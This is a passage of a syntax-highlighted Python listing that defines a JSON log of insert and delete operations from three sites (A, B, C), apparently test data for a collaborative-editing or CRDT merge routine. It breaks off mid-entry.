</span><span class="lnt">1873
</span><span class="lnt">1874
</span><span class="lnt">1875
</span><span class="lnt">1876
</span><span class="lnt">1877
</span><span class="lnt">1878
</span><span class="lnt">1879
</span><span class="lnt">1880
</span><span class="lnt">1881
</span><span class="lnt">1882
</span><span class="lnt">1883
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">defaultdict</span><span class="p">,</span> <span class="n">deque</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">log_data</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">[
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:1&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;HEAD&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;S&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 1
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:48&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:15&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:35&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:41&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:1&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;i&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 41
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:13&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:54&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:39&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:43&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:2&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;☆&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 43
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:24&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:30&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:29&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:10&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;Y&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 29
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:38&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;b&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 38
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:48&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:17&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:7&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 17
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:27&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:11&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;Y&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 27
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:56&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:47&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:5&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;t&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 47
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:51&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:28&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:18&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:34&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;_&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 8
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:47&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:14&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:6&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;f&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 14
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:13&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:5&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;_&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 5
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:31&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 31
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:20&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 20
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:10&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:10&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;_&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 10
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:26&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:14&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:32&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:41&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:5&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;_&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 41
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:28&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;m&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 28
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:44&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;I&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 44
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:11&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:10&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 11
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:56&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:33&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:52&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:52&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:2&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;≈&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 52
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:19&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:11&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;Q&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 19
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:17&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;x&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 17
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:28&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;1&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 28
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:47&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:13&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:2&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;b&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 13
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:12&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:1&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:1&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 1
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:44&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:15&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:53&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:32&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;P&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 32
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:40&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:42&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:36&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:6&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;p&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 36
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:25&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:3&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:2&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;D&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 3
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:24&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:28&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:23&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:12&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;★&#34;,
